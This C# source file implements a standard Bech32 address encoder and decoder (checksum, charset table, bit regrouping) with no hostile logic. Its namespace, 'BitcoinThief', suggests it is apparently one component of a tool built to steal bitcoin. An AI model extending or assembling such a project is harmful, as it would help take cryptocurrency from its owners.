using System;
using System.Collections.Generic;

namespace BitcoinThief.Encoding
{
    public class Bech32Encoder
    {
        private const string Charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
        private static readonly uint[] GeneratorNums = {0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3};

        private static readonly short[] CharTable =
        {
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            15, -1, 10, 17, 21, 20, 26, 30, 7, 5, -1, -1, -1, -1, -1, -1,
            -1, 29, -1, 24, 13, 25, 9, 8, 23, -1, 18, 22, 31, 27, 19, -1,
            1, 0, 3, 16, 11, 28, 12, 14, 6, 4, 2, -1, -1, -1, -1, -1,
            -1, 29, -1, 24, 13, 25, 9, 8, 23, -1, 18, 22, 31, 27, 19, -1,
            1, 0, 3, 16, 11, 28, 12, 14, 6, 4, 2, -1, -1, -1, -1, -1
        };

        private static uint _PolyMod(IEnumerable<byte> values)
        {
            uint chk = 1;
            foreach (var value in values)
            {
                var top = chk >> 25;
                chk = ((chk & 0x1ffffff) << 5) ^ value;
                for (var i = 0; i < 5; ++i)
                    if (((top >> i) & 1) == 1)
                        chk ^= GeneratorNums[i];
            }

            return chk;
        }

        private static void _DecodeSquashed(string adr, out string hrp, out byte[] data)
        {
            adr = _CheckAndFormat(adr);
            if (adr == null)
            {
                data = null;
                hrp = null;
                return;
            }

            var splitLoc = adr.LastIndexOf("1", StringComparison.Ordinal);
            if (splitLoc == -1)
            {
                data = null;
                hrp = null;
                return;
            }

            hrp = adr.Substring(0, splitLoc);
            var squashed = _StringToSquashedBytes(adr.Substring(splitLoc + 1));
            if (squashed == null)
            {
                data = null;
                return;
            }

            if (!_VerifyChecksum(hrp, squashed))
            {
                data = null;
                return;
            }

            var length = squashed.Length - 6;
            data = new byte[length];
            Array.Copy(squashed, 0, data, 0, length);
        }

        private static string _CheckAndFormat(string adr)
        {
            var lowAdr = adr.ToLower();
            var highAdr = adr.ToUpper();

            if (adr != lowAdr && adr != highAdr) return null;
            return lowAdr;
        }

        private static bool _VerifyChecksum(string hrp, byte[] data)
        {
            var values = _HrpExpand(hrp).ConcatArrays(data);
            var checksum = _PolyMod(values);
            return checksum == 1;
        }

        private static byte[] _StringToSquashedBytes(string input)
        {
            var squashed = new byte[input.Length];

            for (var i = 0; i < input.Length; i++)
            {
                var c = input[i];
                var buffer = CharTable[c];
                if (buffer == -1) return null;
                squashed[i] = (byte) buffer;
            }

            return squashed;
        }

        private static string _EncodeSquashed(string hrp, byte[] data)
        {
            var values = _HrpExpand(hrp).ConcatArrays(data).ConcatArrays(new byte[6]);
            var checksum1 = _PolyMod(values) ^ 1;

            var ret = new byte[6];
            for (var i = 0; i < 6; i++) ret[i] = (byte) ((checksum1 >> (5 * (5 - i))) & 0x1f);
            var checksum = ret;
            var combined = data.ConcatArrays(checksum);

            var encoded = _SquashedBytesToString(combined);
            if (encoded == null) return null;
            return hrp + "1" + encoded;
        }

        private static byte[] _HrpExpand(string input)
        {
            var output = new byte[input.Length * 2 + 1];

            for (var i = 0; i < input.Length; i++)
            {
                var c = input[i];
                output[i] = (byte) (c >> 5);
            }

            for (var i = 0; i < input.Length; i++)
            {
                var c = input[i];
                output[i + input.Length + 1] = (byte) (c & 0x1f);
            }

            return output;
        }

        private static string _SquashedBytesToString(IEnumerable<byte> input)
        {
            var s = string.Empty;
            foreach (var c in input)
            {
                if ((c & 0xe0) != 0) return null;
                s += Charset[c];
            }

            return s;
        }

        private static byte[] _ByteSquash(IEnumerable<byte> input, int inputWidth, int outputWidth)
        {
            var bitStash = 0;
            var accumulator = 0;
            var output = new List<byte>();
            var maxOutputValue = (1 << outputWidth) - 1;

            foreach (var c in input)
            {
                if (c >> inputWidth != 0) return null;
                accumulator = (accumulator << inputWidth) | c;
                bitStash += inputWidth;
                while (bitStash >= outputWidth)
                {
                    bitStash -= outputWidth;
                    output.Add((byte) ((accumulator >> bitStash) & maxOutputValue));
                }
            }

            if (inputWidth == 8 && outputWidth == 5 && bitStash != 0)
                output.Add((byte) ((accumulator << (outputWidth - bitStash)) & maxOutputValue));
            else if (bitStash >= inputWidth || ((accumulator << (outputWidth - bitStash)) & maxOutputValue) != 0)
                return null;
            return output.ToArray();
        }

        // //// //////// GENERIC PUBLIC METHOD //////// //// //

        /// <summary>
        ///     Try decode a bech32 string into bytes. The function checks whether the input string is valid.
        /// </summary>
        /// <param name="data">The bech32 string data to be decoded.</param>
        /// <param name="hrp">The human readable part of the input <paramref name="data" />. Does not include the "1".</param>
        /// <param name="result">The decoded bytes. Yields <c>null</c> if <paramref name="data" /> is invalid.</param>
        /// <returns>A <see cref="bool" /> value indicating whether the input <paramref name="data" /> is valid.</returns>
        public bool TryDecode(string data, out string hrp, out byte[] result)
        {
            _DecodeSquashed(data, out hrp, out var squashed);
            if (squashed == null)
            {
                result = null;
                return false;
            }

            result = _ByteSquash(squashed.SubArray(1, squashed.Length - 1), 5, 8);
            return true;
        }

        /// <summary>
        ///     Encodes a binary data into bech32 string.
        /// </summary>
        /// <param name="hrp">The human readable part of the bech32 string. Does not include the "1".</param>
        /// <param name="data">The data to be encoded.</param>
        /// <param name="version">The bech32 version. Defaults to <c>0</c>.</param>
        /// <returns>The encoded bech32 string.</returns>
        public string Encode(string hrp, byte[] data, byte version = 0x00)
        {
            var base5 = new[] {version}.ConcatArrays(_ByteSquash(data, 8, 5));
            return base5 == null ? string.Empty : _EncodeSquashed(hrp, base5);
        }
    }
}
